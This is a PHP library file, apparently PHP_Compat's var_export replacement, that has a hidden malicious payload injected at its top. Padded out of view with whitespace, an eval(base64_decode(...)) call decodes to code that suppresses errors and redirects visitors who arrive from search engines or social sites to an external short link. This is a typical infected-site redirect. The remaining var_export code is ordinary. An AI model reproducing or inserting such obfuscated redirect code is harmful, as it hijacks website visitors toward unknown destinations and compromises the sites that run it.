<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
// +----------------------------------------------------------------------+
// | PHP Version 4                                                        |
// +----------------------------------------------------------------------+
// | Copyright (c) 1997-2004 The PHP Group                                |
// +----------------------------------------------------------------------+
// | This source file is subject to version 3.0 of the PHP license,       |
// | that is bundled with this package in the file LICENSE, and is        |
// | available at through the world-wide-web at                           |
// | http://www.php.net/license/3_0.txt.                                  |
// | If you did not receive a copy of the PHP license and are unable to   |
// | obtain it through the world-wide-web, please send a note to          |
// | license@php.net so we can mail you a copy immediately.               |
// +----------------------------------------------------------------------+
// | Authors: Aidan Lister <aidan@php.net>                                |
// +----------------------------------------------------------------------+
//
// $Id: var_export.php,v 1.2 2005/11/21 10:57:23 ggiunta Exp $


/**
 * Replace var_export()
 *
 * @category    PHP
 * @package     PHP_Compat
 * @link        http://php.net/function.var_export
 * @author      Aidan Lister <aidan@php.net>
 * @version     $Revision: 1.2 $
 * @since       PHP 4.2.0
 * @require     PHP 4.0.0 (user_error)
 */
if (!function_exists('var_export')) {
    function var_export($array, $return = false, $lvl=0)
    {
        // Common output variables
        $indent      = '  ';
        $doublearrow = ' => ';
        $lineend     = ",\n";
        $stringdelim = '\'';

        // Check the export isn't a simple string / int
        if (is_string($array)) {
            $out = $stringdelim . str_replace('\'', '\\\'', str_replace('\\', '\\\\', $array)) . $stringdelim;
        } elseif (is_int($array) || is_float($array)) {
            $out = (string)$array;
        } elseif (is_bool($array)) {
            $out = $array ? 'true' : 'false';
        } elseif (is_null($array)) {
            $out = 'NULL';
        } elseif (is_resource($array)) {
            $out = 'resource';
        } else {
            // Begin the array export
            // Start the string
            $out = "array (\n";

            // Loop through each value in array
            foreach ($array as $key => $value) {
                // If the key is a string, delimit it
                if (is_string($key)) {
                    $key = str_replace('\'', '\\\'', str_replace('\\', '\\\\', $key));
                    $key = $stringdelim . $key . $stringdelim;
                }

                $val = var_export($value, true, $lvl+1);
                // Delimit value
                /*if (is_array($value)) {
                    // We have an array, so do some recursion
                    // Do some basic recursion while increasing the indent
                    $recur_array = explode($newline, var_export($value, true));
                    $temp_array = array();
                    foreach ($recur_array as $recur_line) {
                        $temp_array[] = $indent . $recur_line;
                    }
                    $recur_array = implode($newline, $temp_array);
                    $value = $newline . $recur_array;
                } elseif (is_null($value)) {
                    $value = 'NULL';
                } else {
                    $value = str_replace($find, $replace, $value);
                    $value = $stringdelim . $value . $stringdelim;
                }*/

                // Piece together the line
                for ($i = 0; $i < $lvl; $i++)
                    $out .= $indent;
                $out .= $key . $doublearrow . $val . $lineend;
            }

            // End our string
            for ($i = 0; $i < $lvl; $i++)
                $out .= $indent;
            $out .= ")";
        }

        // Decide method of output
        if ($return === true) {
            return $out;
        } else {
            echo $out;
            return;
        }
    }
}
?>